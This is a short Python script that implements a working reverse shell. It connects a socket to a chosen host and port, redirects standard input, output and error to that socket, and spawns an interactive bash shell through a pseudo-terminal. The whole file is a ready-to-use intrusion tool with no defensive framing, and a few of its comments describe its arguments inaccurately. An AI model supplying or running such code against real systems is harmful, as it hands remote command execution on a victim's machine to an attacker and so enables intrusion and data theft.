#language:python


# This script is a python script that is used to spawn a shell on a remote system.

# Import the socket, os, argparse, and pty modules.
import socket
import os
import argparse
import pty


if __name__ == "__main__":
    # Initialize the parser object.
    parser=argparse.ArgumentParser()

    # The shell argument is used to specify the shell to spawn on the remote system.
    parser.add_argument('-s', '--shell',
                        required=False,
                        action='store',
                        default="/bin/bash",
                        help="The shell to spawn")
    
    # The host argument is used to specify the IP address of the remote system.
    parser.add_argument('-l', '--host', 
                        required=False, 
                        action='store', 
                        default="127.0.0.1", 
                        help='The IP address to connect to')

    # The port argument is used to specify the port to connect to on the remote system. 
    parser.add_argument('-p', '--port',
                        required=False,
                        type=int, 
                        default=6969, 
                        help="A comma separated list of ports to try to connect to")
    
    # The family argument is used to specify the socket family to use. The default is AF_INET.
    parser.add_argument('-f', '--family',
                        required=False,
                        default=socket.AF_INET,
                        type=lambda s: getattr(socket, s),
                        help="The socket family to use")

    # The type argument is used to specify the socket type to use. The default is SOCK_STREAM.
    parser.add_argument('-t', '--type',
                        required=False,
                        default=socket.SOCK_STREAM,
                        type=lambda s: getattr(socket, s),
                        help="The socket type to use")

    # The protocol argument is used to specify the socket protocol to use. The default is -1.
    parser.add_argument('--protocol',
                        required=False,
                        default=-1,
                        type=int,
                        help="The socket protocol to use")

    # The fileno argument is used to specify the file descriptor to use. The default is None.
    parser.add_argument('--fileno',
                        required=False,
                        default=None,
                        type=int,
                        help="The file descriptor to use")
    
    # Parse the arguments.
    args=parser.parse_args()

    # Create a socket object using the specified socket family, type, protocol, and file descriptor.
    s = socket.socket(family=args.family, type=args.type, proto=args.protocol, fileno=args.fileno)

    # Connect to the remote system using the specified IP address and port.
    s.connect((args.host, args.port))

    # Duplicate the file descriptors for stdin, stdout, and stderr to the socket file descriptor.
    os.dup2(s.fileno(),0)
    os.dup2(s.fileno(),1)
    os.dup2(s.fileno(),2)
    
    # Spawn a shell on the remote system.
    pty.spawn(args.shell)
